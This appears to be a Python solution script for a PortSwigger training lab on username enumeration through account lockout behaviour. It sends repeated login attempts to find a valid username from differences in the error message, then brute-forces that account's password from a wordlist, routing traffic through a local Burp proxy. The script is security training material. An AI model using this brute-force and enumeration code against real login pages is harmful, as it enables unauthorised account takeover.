# PortSwigger
# Lab: Username enumeration via account lock

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = ""
session = ""

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Request Cookies
cookies = {
    "session": session
}

def read_file(path):
    file = open(path, "r")
    list_lines = file.readlines()
    file.close()
    return list_lines

def main():    
    user_name = ''
    password = ''

    list_users = read_file('.\Authentication/usernames.txt')
    list_passwords = read_file('.\Authentication/passwords.txt')

    print("\r(+) Forcing user name...")

    while len(list_users) != 0:
        user = list_users[0].strip()       

        for i in range(6):
            sys.stdout.write("\r> %s attemp %i" % (user, i))
            sys.stdout.flush()

            playload = f"username={user}&password=0"
            response = requests.post(url, data=playload, cookies=cookies, verify=False, proxies=proxies)

            if not 'Invalid username or password' in response.text:
                list_users.clear()
                user_name = user
                break

            sys.stdout.write("\r%s" % (" " * len("> %s attemp %i" % (user, i))))
            sys.stdout.flush()

        else:
            del list_users[0]

    print('\r(+) The username is %s' % user_name)


    print("\r(+) Forcing password...")
    while len(list_passwords) != 0:     
        pwd = list_passwords[0].strip()
        sys.stdout.write("\r%s" % pwd)
        sys.stdout.flush()

        playload = f"username={user_name}&password={pwd}"
        response = requests.post(url, data=playload, cookies=cookies, verify=False, proxies=proxies)

        if not 'Invalid username or password' in response.text and not 'Please try again in 1 minute' in response.text:
            list_passwords.clear()
            password = pwd
        else:
            del list_passwords[0]

        sys.stdout.write("\r%s" % (" " * len(pwd)))
        sys.stdout.flush()


    print('\r(+) The password is %s' % password)


if __name__ == "__main__":
    main()